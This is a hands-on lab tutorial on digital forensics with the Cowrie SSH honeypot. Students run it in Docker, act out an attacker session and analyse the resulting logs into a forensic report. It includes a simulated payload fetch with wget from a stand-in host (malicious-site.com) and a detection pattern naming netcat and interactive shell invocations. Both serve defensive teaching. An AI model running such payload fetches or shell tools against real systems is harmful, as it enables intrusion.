![alt text](<../Screenshots/Cowrie_white.jpg>)

# Hands-on Lab: Digital Forensics with Cowrie Honeypot Logs

**Estimated time:** 15-20 minutes

---

## Project Scenario

Imagine you're a **Security Analyst** at **CloudShield Security**, a managed security service provider monitoring client infrastructure.

Last night, your intrusion detection system flagged multiple failed SSH login attempts against a client's jump server. By the time your team responded, the attacker had already gained access. The client is panicking—they need to know what the attacker did, what commands were executed, and whether data was stolen.

You discover that the affected system is actually a **Cowrie honeypot**—a decoy designed to trap attackers and log their every move. The honeypot has captured the attacker's entire session. Your job: analyze the logs to understand the attacker's tactics, techniques, and procedures (TTPs) before they target a real system.

> **Why Cowrie?** Cowrie is a medium-interaction SSH and Telnet honeypot designed to log brute force attacks and shell interaction. It simulates a vulnerable Unix system, tricking attackers into revealing their methods while capturing every command they execute .

---

## Learning Objectives

At the end of this lab, you will be able to:

| # | Objective                                                     |
| - | ------------------------------------------------------------- |
| 1 | Deploy and run a Cowrie honeypot using Docker                 |
| 2 | Connect to the honeypot via SSH as an attacker would          |
| 3 | Simulate malicious commands on the remote system              |
| 4 | Analyze logs to identify login attempts and executed commands |
| 5 | Extract forensic evidence from honeypot logs                  |

---

## Prerequisites

| Requirement                                  | Status                                |
| :------------------------------------------- | :------------------------------------ |
| **Docker installed**                   | ☐ (Pre-installed in lab environment) |
| **Basic Linux command line knowledge** | ☐                                    |
| **Terminal access**                    | ☐                                    |

---

## What is Cowrie?

Cowrie is a medium-interaction SSH and Telnet honeypot designed to log brute force attacks and shell interaction .

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         HOW COWRIE WORKS                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ATTACKER                      COWRIE HONEYPOT                              │
│   ┌─────────┐                   ┌─────────────────────────────────────┐     │
│   │         │   SSH Connection  │                                     │     │
│   │  Hacker │ ─────────────────►│  Fake File System                   │     │
│   │         │                   │  • Simulated Unix environment       │     │
│   └─────────┘                   │  • No real data at risk             │     │
│         │                       │  • Everything is logged             │     │
│         │                       │                                     │     │
│         │    Executes Commands  │  ┌───────────────────────────────┐  │     │
│         ├──────────────────────►│  │ LOGS (Captures everything)     │  │     │
│         │                       │  │ • Login attempts               │  │     │
│         │                       │  │ • Commands executed            │  │     │
│         │                       │  │ • File downloads/uploads       │  │     │
│         │                       │  │ • Session timing               │  │     │
│         │                       │  └───────────────────────────────┘  │     │
│         │                       │                                     │     │
│         │    Sees "success"     │  Security Team analyzes logs       │     │
│         │ ◄─────────────────────│  to understand attacker TTPs       │     │
│         │                       │                                     │     │
│         ▼                       ▼                                     │     │
│   Attacker thinks they          Real infrastructure is protected      │     │
│   compromised a real system     while attacker wastes time            │     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Why Use a Honeypot?

| Benefit                         | Description                                         |
| :------------------------------ | :-------------------------------------------------- |
| **Early Warning**         | Detect attacks before they reach production systems |
| **Attacker Intelligence** | Learn TTPs (Tactics, Techniques, Procedures)        |
| **Waste Attacker Time**   | Keep attackers busy on fake systems                 |
| **Legal Evidence**        | Logs can be used to understand attack patterns      |
| **Low Risk**              | No real data is exposed                             |

---

## Part 1: Running Cowrie on Docker

### Step 1: Open a New Terminal

Open a terminal window on your lab system.

![alt text](<../Screenshots/Open_a_New_Terminal.png>)

### Step 2: Start the Cowrie Container

Run the following command to start Cowrie in a Docker container and redirect all logs to a file:

```bash
docker run -p 2222:2222/tcp cowrie/cowrie > honeypotLogs.txt
```

**What this command does:**

- `docker run` - Starts a new Docker container
- `-p 2222:2222/tcp` - Maps port 2222 on your machine to port 2222 in the container
- `cowrie/cowrie` - The Docker image to run
- `> honeypotLogs.txt` - Redirects all log output to a file

> **Note:** Please wait until the download finishes completely before moving to the next step.

![Cowrie Starting]

*[Screenshot: Terminal showing Cowrie Docker container starting]*

![alt text](<../Screenshots/Cowrie_Starting.png>)

---

## Part 2: Connecting to Cowrie via SSH

Now you will act as an attacker and connect to the honeypot.

### Step 1: Open Another Terminal

Open a **second** terminal window.

### Step 2: SSH to the Cowrie Container

```bash
ssh -p 2222 root@localhost
```

**What this command does:**

- `ssh` - Secure Shell client
- `-p 2222` - Connect to port 2222 (Cowrie's SSH port)
- `root@localhost` - Attempt to log in as user 'root' on local machine

### Step 3: Accept the Host Key

When prompted:

```
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
RSA key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

Type `yes` and press **Enter**.

### Step 4: Enter the Password

When prompted for the password:

```
root@localhost's password:
```

Type `admin` and press **Enter**.

> **Note:** When entering a password in the terminal, no characters or symbols will appear on the screen for security reasons. This is normal behavior—type the password and press Enter.

### Step 5: Successful Connection

You should now see the root prompt, indicating you are "inside" the honeypot:

```
root@cowrie:~#
```

> **Important:** This session times out in 3-4 minutes if not used.

![SSH Connection Successful]

*[Screenshot: Terminal showing successful SSH connection to Cowrie]*

![alt text](<../Screenshots/SSH_Connection_Successful.png>)

---

## Part 3: Simulating Attacker Commands

Now that you're connected, simulate the commands an attacker might run.

### Step 1: List Directory Contents

```bash
ls
```

Expected output (varies but may show common Unix directories):

```
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
```

### Step 2: Create a File

Create a new file by redirecting echo output:

```bash
echo "This is sensitive data that the attacker is stealing" > stolen_data.txt
```

### Step 3: Verify File Creation

Check if the file was created:

```bash
cat stolen_data.txt
```

Expected output:

```
This is sensitive data that the attacker is stealing
```
![alt text](<../Screenshots/Verify_File_Creation.png>)

![alt text](<../Screenshots/Telnet_to_Cowrie.png>)

### Step 4: Attempt to Download Malicious Payload (Simulated)

```bash
wget http://malicious-site.com/payload.sh
```

Cowrie will simulate a download (it won't actually download anything, but will log the attempt).

### Step 5: Delete the File (Cover Tracks)

```bash
rm -f stolen_data.txt
```

### Step 6: Exit the Session

```bash
exit
```

![alt text](<../Screenshots/Attempt_to_Download_Malicious_Payload_(Simulated).png>)

---

## Part 4: Analyzing the Logs

Now it's time to act as the forensic investigator and analyze what was captured.

### Step 1: Open a Third Terminal

Open a **third** terminal window.

### Step 2: View All Logs

First, look at the raw log file:

```bash
cat honeypotLogs.txt
```

![alt text](<../Screenshots/View_All_Logs.png>)

You'll see a lot of JSON-formatted log entries.

### Step 3: Find Login Attempts

Search the logs for login attempts:

```bash
cat honeypotLogs.txt | grep "login attempt"
```

You should see output similar to:

```
2025-05-07T10:15:23.123456Z [cowrie] login attempt [root/admin] succeeded
```

This shows:

- **Timestamp:** When the login occurred
- **Username attempted:** root
- **Password:** admin
- **Result:** succeeded (because Cowrie accepts any credentials)

![Login Attempt Logs]

*[Screenshot: Terminal showing grep results for "login attempt"]*

![alt text](<../Screenshots/Login_Attempt_Logs.png>)

### Step 4: Find Executed Commands

Search for all commands that were executed:

```bash
cat honeypotLogs.txt | grep "CMD"
```

Expected output:

```
2025-05-07T10:15:30.123456Z [cowrie] CMD: ls
2025-05-07T10:15:45.123456Z [cowrie] CMD: echo "This is sensitive data that the attacker is stealing" > stolen_data.txt
2025-05-07T10:15:52.123456Z [cowrie] CMD: cat stolen_data.txt
2025-05-07T10:16:01.123456Z [cowrie] CMD: wget http://malicious-site.com/payload.sh
2025-05-07T10:16:10.123456Z [cowrie] CMD: rm -f stolen_data.txt
2025-05-07T10:16:15.123456Z [cowrie] CMD: exit
```

![Command Logs]

*[Screenshot: Terminal showing grep results for "CMD"]*

![alt text](<../Screenshots/Command_Logs.png>)


### Step 5: Find More Detailed Session Information

Search for session details:

```bash
cat honeypotLogs.txt | grep "session"
```
![alt text](<../Screenshots/Find_More_Detailed_Session_Information.png>)

![alt text](<../Screenshots/Connection_Lost_After.png>)


### Step 6: Extract All Commands in Order

To see the complete command sequence in chronological order:

```bash
cat honeypotLogs.txt | grep "CMD" | cut -d'"' -f2
```

This extracts just the command text.


![alt text](<../Screenshots/Extract_All_Commands_in_Order.png>)

### Step 7: Check for File Downloads

Search for file download attempts:

```bash
cat honeypotLogs.txt | grep "wget\|curl\|download"
```

![alt text](<../Screenshots/Check_for_File_Downloads.png>)

---

## Part 5: Analysis Questions

Based on your log analysis, answer the following questions:

| # | Question                                            | Your Answer |
| - | --------------------------------------------------- | ----------- |
| 1 | What username and password were used to log in?     |             |
| 2 | What was the first command executed after login?    |             |
| 3 | What filename was created by the attacker?          |             |
| 4 | What command did the attacker use to read the file? |             |
| 5 | What URL did the attacker attempt to download from? |             |
| 6 | How did the attacker try to cover their tracks?     |             |
| 7 | At what time did the attacker exit the session?     |             |

---

## Part 6: Advanced Log Analysis

### Extract Login Timestamp

```bash
cat honeypotLogs.txt | grep "login attempt" | cut -d' ' -f1
```

![alt text](<../Screenshots/Extract_Login_Timestamp.png>)

### Count Total Commands Executed

```bash
cat honeypotLogs.txt | grep "CMD" | wc -l
```

![alt text](<../Screenshots/Count_Total_Commands_Executed.png>)

### Find Suspicious Patterns

Look for common attacker commands:

```bash
cat honeypotLogs.txt | grep -E "wget|curl|nc|netcat|python -c|bash -i|sh -i"
```

![alt text](<../Screenshots/Find_Suspicious_Patterns.png>)

### Create a Timeline of Events

```bash
cat honeypotLogs.txt | grep -E "login attempt|CMD|session" | cut -d' ' -f1-2
```

![alt text](<../Screenshots/Create_a_Timeline_of_Events.png>)

---

## Part 7: Forensic Report Template

Create a forensic report documenting your findings:

```
FORENSIC INVESTIGATION REPORT
==============================

Case ID: COWRIE-2025-001
Investigator: [Your Name]
Date: [Current Date]

1. EXECUTIVE SUMMARY
   - Honeypot detected unauthorized SSH access
   - Attacker executed 6 commands during 45-second session
   - No actual data was compromised (honeypot environment)

2. TIMELINE OF EVENTS
   - HH:MM:SS - Login successful (root/admin)
   - HH:MM:SS - Command: ls
   - HH:MM:SS - Command: echo > stolen_data.txt
   - HH:MM:SS - Command: cat stolen_data.txt
   - HH:MM:SS - Command: wget http://malicious-site.com/payload.sh
   - HH:MM:SS - Command: rm -f stolen_data.txt
   - HH:MM:SS - Session terminated

3. INDICATORS OF COMPROMISE (IOCs)
   - Username: root
   - Password: admin
   - Malicious URL: http://malicious-site.com/payload.sh

4. ATTACKER TTPs
   - Initial Access: SSH brute force (password guessing)
   - Execution: Used echo, wget, rm commands
   - Defense Evasion: Deleted created files
   - Collection: Attempted to exfiltrate via file creation

5. RECOMMENDATIONS
   - Block malicious URLs at firewall
   - Disable root SSH login
   - Implement strong password policies
   - Deploy additional honeypots on critical segments
```

---

## Lab Completion Checklist

| Task                                            | Completed |
| :---------------------------------------------- | :-------- |
| **Part 1: Run Cowrie**                    | ☐        |
| Docker container started successfully           | ☐        |
| Logs redirected to honeypotLogs.txt             | ☐        |
| **Part 2: Connect via SSH**               | ☐        |
| SSH connection established on port 2222         | ☐        |
| Password "admin" accepted                       | ☐        |
| Root prompt displayed                           | ☐        |
| **Part 3: Simulate Commands**             | ☐        |
| `ls` command executed                         | ☐        |
| File created with echo                          | ☐        |
| File content verified with cat                  | ☐        |
| wget command attempted                          | ☐        |
| File deleted with rm                            | ☐        |
| Session exited                                  | ☐        |
| **Part 4: Analyze Logs**                  | ☐        |
| `grep "login attempt"` shows successful login | ☐        |
| `grep "CMD"` shows all commands               | ☐        |
| Command sequence identified                     | ☐        |
| **Part 5: Questions**                     | ☐        |
| All 7 analysis questions answered               | ☐        |
| **Part 6: Report**                        | ☐        |
| Forensic report template completed              | ☐        |

---

## Screenshot Checklist

| Screenshot                | Description                                     |
| :------------------------ | :---------------------------------------------- |
| `cowrie_start.png`      | Cowrie Docker container starting                |
| `ssh_connect.png`       | SSH connection to port 2222                     |
| `commands_executed.png` | Commands executed in the honeypot               |
| `login_attempt_log.png` | grep results for "login attempt"                |
| `cmd_log.png`           | grep results for "CMD" showing command sequence |
| `forensic_report.png`   | Completed forensic report                       |

---

## Troubleshooting Tips

| Issue                              | Solution                                                                                                |
| :--------------------------------- | :------------------------------------------------------------------------------------------------------ |
| **Docker not found**         | Docker is pre-installed in the lab environment; if missing, install with `sudo apt install docker.io` |
| **Port 2222 already in use** | Stop any service using port 2222 or use a different port                                                |
| **Connection refused**       | Wait for Cowrie to fully start (30-60 seconds)                                                          |
| **Session times out**        | Cowrie sessions timeout after 3-4 minutes; reconnect if needed                                          |
| **No logs in file**          | Check that `>` redirect was used correctly (not `\|`)                                                |
| **grep returns nothing**     | Check you're searching the correct filename; try `cat honeypotLogs.txt \| head -20`                    |

---

## Key Takeaways

| Concept                | Description                                                                    |
| :--------------------- | :----------------------------------------------------------------------------- |
| **Honeypot**     | Decoy system designed to trap attackers and log their activities               |
| **Cowrie**       | Medium-interaction SSH/Telnet honeypot that simulates a vulnerable Unix system |
| **Log Analysis** | Examining honeypot logs to understand attacker behavior                        |
| **TTPs**         | Tactics, Techniques, and Procedures used by attackers                          |
| **IOCs**         | Indicators of Compromise (IPs, usernames, URLs, file hashes)                   |

---

## Real-World Application

In a real SOC environment, Cowrie honeypots are deployed alongside production systems to:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    COWRIE IN PRODUCTION                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   INTERNET                        CORPORATE NETWORK                         │
│   ┌─────────┐                     ┌─────────────────────────────────────┐   │
│   │         │                     │  ┌─────────┐    ┌─────────┐          │   │
│   │ Attacker│                     │  │ Real    │    │ Real    │          │   │
│   │         │                     │  │ Server  │    │ Server  │          │   │
│   └────┬────┘                     │  └─────────┘    └─────────┘          │   │
│        │                          │       │              │               │   │
│        │                          │       └──────┬───────┘               │   │
│        │                          │              │                       │   │
│        ▼                          │   ┌──────────▼──────────┐            │   │
│   ┌─────────┐                      │   │   COWRIE HONEYPOT   │            │   │
│   │ Firewall│                      │   │   (Decoy System)    │            │   │
│   └────┬────┘                      │   │                     │            │   │
│        │                           │   │ • Logs all activity │            │   │
│        │                           │   │ • Alerts SOC        │            │   │
│        ▼                           │   │ • Captures malware  │            │   │
│   Attacker scans all IPs           │   └─────────────────────┘            │   │
│   Honeypot responds like            │              │                       │   │
│   a real server                     │              ▼                       │   │
│   Attacker attacks honeypot         │   ┌─────────────────────┐           │   │
│   Real servers remain safe          │   │   SIEM / Splunk     │           │   │
│                                     │   │   (Log Analysis)    │           │   │
│                                     │   └─────────────────────┘           │   │
│                                     └─────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Additional Commands for Cowrie

If you want to explore more commands that Cowrie simulates:

| Command             | What Cowrie Does               |
| :------------------ | :----------------------------- |
| `help`            | Shows available commands       |
| `whoami`          | Returns "root"                 |
| `id`              | Shows fake user ID information |
| `pwd`             | Shows current directory        |
| `uname -a`        | Shows fake system information  |
| `ps aux`          | Shows simulated process list   |
| `netstat -an`     | Shows fake network connections |
| `cat /etc/passwd` | Returns simulated passwd file  |

---

## Test Your Knowledge

**Q1:** What is a honeypot and why is it used?

```
Your answer:
_________________________________________________________________________
```

**Q2:** What password did Cowrie accept for the root user?

```
Your answer:
_________________________________________________________________________
```

**Q3:** What command would you use to find all executed commands in the log file?

```
Your answer:
_________________________________________________________________________
```

**Q4:** Why does Cowrie log commands even when they don't actually execute on a real system?

```
Your answer:
_________________________________________________________________________
```

**Q5:** How could you modify the docker run command to save logs to a different filename?

```
Your answer:
_________________________________________________________________________
```

### Answer Key

| Q# | Answer                                                                                                                                                       |
| -- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1  | A honeypot is a decoy system designed to attract attackers, log their activities, and keep them away from real systems                                       |
| 2  | `admin`                                                                                                                                                    |
| 3  | `cat honeypotLogs.txt \| grep "CMD"`                                                                                                                        |
| 4  | Cowrie is designed to simulate a real system—attackers don't know it's fake, so they reveal their methods while thinking they're compromising a real server |
| 5  | Change the redirect filename:`docker run -p 2222:2222/tcp cowrie/cowrie > mylogfile.txt`                                                                   |

---

## Summary

In this lab, you have:

| Activity                                              | Completed |
| :---------------------------------------------------- | :-------- |
| Deployed a Cowrie honeypot using Docker               | ☐        |
| Connected to the honeypot via SSH                     | ☐        |
| Simulated attacker commands (ls, echo, cat, wget, rm) | ☐        |
| Analyzed logs to find login attempts                  | ☐        |
| Extracted all executed commands                       | ☐        |
| Created a forensic report                             | ☐        |

These skills are essential for:

- Security analysts investigating compromised systems
- Incident responders analyzing attacker behavior
- Threat intelligence teams gathering TTPs
- SOC teams deploying deception technology

---

## Additional Resources

| Resource                       | URL                                    |
| :----------------------------- | :------------------------------------- |
| **Cowrie GitHub**        | https://github.com/cowrie/cowrie       |
| **Cowrie Documentation** | https://cowrie.readthedocs.io          |
| **Docker Hub - Cowrie**  | https://hub.docker.com/r/cowrie/cowrie |

---

## Congratulations!

You have successfully completed the **Digital Forensics with Cowrie Honeypot Logs** lab. You now know how to:

- Deploy a Cowrie honeypot using Docker
- Simulate attacker activity on a decoy system
- Analyze logs to identify login attempts and executed commands
- Extract forensic evidence for incident reporting
- Understand attacker TTPs from honeypot data

This lab demonstrated the power of **proactive deception** in cybersecurity—setting traps to catch attackers and learn their methods without putting real systems at risk. As one security expert noted, "Deception technology like Cowrie gives defenders an asymmetric advantage against attackers."
